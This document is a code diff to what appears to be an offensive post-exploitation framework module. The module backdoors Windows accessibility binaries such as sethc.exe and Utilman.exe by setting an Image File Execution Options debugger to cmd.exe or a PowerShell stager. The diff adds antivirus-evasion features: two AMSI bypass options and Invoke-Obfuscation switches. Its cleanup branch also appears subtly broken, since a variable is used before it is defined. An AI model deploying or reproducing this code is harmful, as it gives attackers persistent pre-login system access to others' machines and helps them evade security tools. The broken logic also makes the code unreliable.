@@ -1,6 +1,11 @@
+from __future__ import print_function
+
+from builtins import object
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +17,10 @@ class Module:
             'Description': ("Sets the debugger for a specified target binary to be cmd.exe, "
                             "another binary of your choice, or a listern stager. This can be launched from "
                             "the ease-of-access center (ctrl+U)."),
+
+            'Software': '',
+
+            'Techniques': ['T1044'],
 
             'Background' : False,
 
@@ -42,6 +51,26 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'TargetBinary' : {
                 'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
                 'Required'      :   True,
@@ -50,7 +79,7 @@ class Module:
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
-                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
+                'Value'         :   r'HKLM:Software\Microsoft\Network\debug'
             },
             'Cleanup' : {
                 'Description'   :   'Switch. Disable the Utilman.exe debugger.',
@@ -60,7 +89,7 @@ class Module:
             'TriggerBinary' : {
                 'Description'   :   'Binary to set for the debugger.',
                 'Required'      :   False,
-                'Value'         :   'C:\Windows\System32\cmd.exe'
+                'Value'         :   r'C:\Windows\System32\cmd.exe'
             }
         }
 
@@ -74,8 +103,11 @@ class Module:
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self, obfuscate=False, obfuscationCommand=""):
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
 
         # management options
         cleanup = self.options['Cleanup']['Value']        
@@ -86,29 +118,39 @@ class Module:
         # storage options
         regPath = self.options['RegPath']['Value']
 
+        # staging options
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
+
         statusMsg = ""
         locationString = ""
-
 
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for Utilman.exe
             script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
         
-
         if listenerName != '':
             # if there's a listener specified, generate a stager and store it
 
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
                 # generate the PowerShell one-liner
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell')
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', obfuscate=Obfuscate,
+                                                                   obfuscationCommand=ObfuscateCommand, AMSIBypass=AMSIBypass,
+                                                                   AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -132,6 +174,9 @@ class Module:
         else:
             # the registry command to set the debugger for the specified binary to be the binary path specified
             script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
